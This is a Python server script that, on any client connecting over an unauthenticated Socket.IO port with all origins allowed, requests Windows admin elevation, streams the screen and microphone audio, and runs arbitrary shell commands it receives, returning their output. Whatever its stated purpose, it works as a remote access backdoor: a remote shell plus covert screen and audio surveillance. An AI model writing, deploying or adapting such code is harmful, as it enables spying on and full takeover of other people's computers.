import asyncio
import socketio
import base64
from aiohttp import web
import mss
import subprocess
import os
import sys
import ctypes
from PIL import Image
import io
import pyaudio
import wave

sio = socketio.AsyncServer(cors_allowed_origins='*')
app = web.Application()
sio.attach(app)

SOCKET_PORT = 4101

working_dir = "."
_capture_screen = bool(False)

FORMAT = pyaudio.paInt16
CHANNELS = 1  # mono audio
RATE = 44100  # sampling rate
CHUNK = 1024  # buffer size
RECORD_SECONDS = 2  # duration of each audio capture
DELAY_SECONDS = 0.075  # delay between iterations

@sio.event
async def connect(sid, environ):
    print('connect', sid)
    get_admin()
    await sio.emit('command_dir', os.path.abspath(working_dir))

@sio.event
async def disconnect(sid):
    print('disconnect', sid)
    await stop_stream()
    
@sio.event
async def start_stream(*_):
    print("start_stream")
    global _capture_screen
    _capture_screen = True
    # await capture_screen()
    asyncio.create_task(capture_screen())

    
async def capture_screen():
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        input_device_index=0,
                        frames_per_buffer=CHUNK)
    
    
    while _capture_screen:
        with mss.mss() as sct:
            sct.compression_level = 1
            monitor = sct.monitors[1]  # or a specific region
            sct_img = sct.grab(monitor)

            # Convert the captured image to a PIL Image
            img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)

            # Resize the image
            width, height = img.size
            if img.size == (1920, 1080):
                img_resized = img.resize((width // 2, height // 2), Image.LANCZOS)
            elif img.size == (3840, 2160):
                img_resized = img.resize((width // 4, height // 4), Image.LANCZOS)
            else:
                img_resized = img.resize((width // 3, height // 3), Image.LANCZOS)

            # Save as PNG and encode in base64
            with io.BytesIO() as output:
                img_resized.save(output, format="PNG")
                png_data = output.getvalue()

            png_data_encoded = base64.b64encode(png_data).decode()

            # Emit screen data
            await sio.emit('stream_data', png_data_encoded)

        # Audio capture
        frames = []

        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        with io.BytesIO() as output:
            with wave.open(output, 'wb') as wf:
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(audio.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))

            wav_data = output.getvalue()
            wav_data_encoded = base64.b64encode(wav_data).decode()

        # Emit audio data
        await sio.emit('audio_data', wav_data_encoded)

        # Delay between iterations
        await asyncio.sleep(DELAY_SECONDS)
        
    stream.stop_stream()
    stream.close()
    audio.terminate()

@sio.event
async def stop_stream(*_):
    global _capture_screen
    _capture_screen = False
    print("stop_screen")
    

@sio.event
async def command_input(_, cmd_in):
    # Function to execute a command and save its output
    async def doCMD(cmd, working_dir):
        # Check if command is 'cd'
        if cmd.startswith("cd "):
            vals = cmd.split("cd ")
            if vals[1].startswith("/"):
                working_dir = vals[1]
            else:
                working_dir = os.path.join(working_dir, vals[1])
            
            # Change the working directory
            os.chdir(working_dir)
            print(os.popen('cd').read().strip())
            await sio.emit('command_dir', os.popen('cd').read().strip())
            await sio.emit('command_output', os.popen('cd').read().strip())
        else:
            # Execute the command and get the output
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=working_dir)
            await sio.emit('command_output', result.stdout)
            await sio.emit('command_output_error', result.stderr)
        
        return working_dir

    # Main loop to read commands and execute them
    async def command_loop(working_dir):
        working_dir = await doCMD(cmd_in, working_dir)

    # Run the command loop
    await command_loop(working_dir)

def get_admin(*_):
    # Check if running with admin privileges
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    # Relaunch the script with admin privileges if needed
    def run_as_admin():
        if not is_admin():
            script = os.path.abspath(sys.argv[0])
            params = ' '.join([str(arg) for arg in sys.argv[1:]])
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)

    # Run the script with admin permissions
    run_as_admin()


if __name__ == '__main__':
    web.run_app(app=app, port=SOCKET_PORT)
